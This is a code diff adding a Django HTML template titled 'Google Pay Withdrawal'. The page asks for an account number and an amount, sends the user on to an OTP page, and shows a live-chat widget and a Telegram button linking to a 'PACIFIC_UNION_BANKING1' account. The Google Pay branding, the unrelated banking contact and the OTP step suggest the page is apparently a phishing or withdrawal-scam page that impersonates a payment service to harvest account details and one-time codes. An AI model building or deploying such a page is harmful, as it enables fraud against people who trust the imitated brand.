@@ -1,0 +1,159 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Pay Withdrawal</title>
+      <!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '60bcd766b3d111d8981d2933c94e036c631cdb4e';
+window.smartsupp||(function(d) {
+	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+	c.type='text/javascript';c.charset='utf-8';c.async=true;
+	c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+  <style type="text/css" media="all">
+      body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background-color: navy;
+}
+
+.telegram-icon {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background-color: #0088cc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    animation: float 2s infinite;
+    cursor: pointer;
+    transition: transform 0.3s;
+}
+
+.telegram-icon img {
+    width: 70%;
+    height: 70%;
+}
+
+.telegram-icon:hover {
+    transform: scale(1.1);
+}
+
+@keyframes float {
+    0%, 100% {
+        transform: translateY(0);
+    }
+    50% {
+        transform: translateY(-10px);
+    }
+}
+
+.container {
+  max-width: 400px;
+  margin: 50px auto;
+  padding: 20px;
+  background-color: #fff;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  text-align: center;
+}
+
+.google-pay-logo {
+  width: 100px;
+  height: 100px;
+  background: url(static/images/lgp.png) no-repeat center center/contain;
+  margin: 0 auto 20px;
+}
+
+.google-pay-icon {
+  width: 50px;
+  margin-top: 20px;
+}
+
+h1 {
+  margin-bottom: 20px;
+  color: #333;
+}
+
+#withdrawal-form {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+label {
+  margin-bottom: 10px;
+}
+
+input {
+  padding: 10px;
+  width: 90%;
+  margin-bottom: 20px;
+}
+
+button {
+  padding: 10px 20px;
+  background-color: #4285F4;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
+
+button:hover {
+  background-color: #357AE8;
+}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Withdraw to Google Pay</h1>
+    <form action="{% url 'OTP' %}" id="your_form">
+       <input type="number" id="amount" name="amount" placeholder="Enter Account Number">
+      <input type="number" id="amount" name="amount" placeholder="Enter amount">
+      <button onclick="submitForm()" type="submit">Withdraw</button>
+    </form>
+    <img src="{% static 'images/gp.png' %}" alt="Google Pay Icon" class="google-pay-icon">
+  </div>
+ <div class="telegram-icon">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+    </div>
+  <script type="text/javascript" charset="utf-8">
+
+// document.getElementById('withdrawal-form').addEventListener('submit', function(event) {
+//   event.preventDefault();
+//   // Simulate withdrawal process
+//   alert('Withdrawal process initiated. Please wait...');
+//   // You can add further processing logic here
+// });
+
+ function submitForm() {
+            // Perform any form validation here if needed
+
+            // Submit the form
+            document.getElementById("your_form").submit();
+
+            // Redirect to another page
+            window.location.href = "{% url 'OTP' %}";
+        }
+ document.querySelector('.telegram-icon').addEventListener('click', function() {
+    window.open('https://t.me/PACIFIC_UNION_BANKING1', '_blank');
+});
+
+  </script>
+</body>
+</html>
+
+
